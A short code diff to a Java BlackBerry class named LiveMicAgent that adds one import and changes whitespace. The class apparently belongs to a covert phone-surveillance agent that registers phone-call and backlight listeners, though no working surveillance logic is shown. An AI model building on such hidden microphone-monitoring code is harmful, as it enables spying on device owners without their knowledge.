@@ -32,6 +32,7 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.AgentManager;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -136,7 +137,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         Phone.addPhoneListener(this);
         AppListener.getInstance().addBacklightObserver(this);
         backlight = Backlight.isEnabled();
-
+        
         //stopAudio();        
     }
 
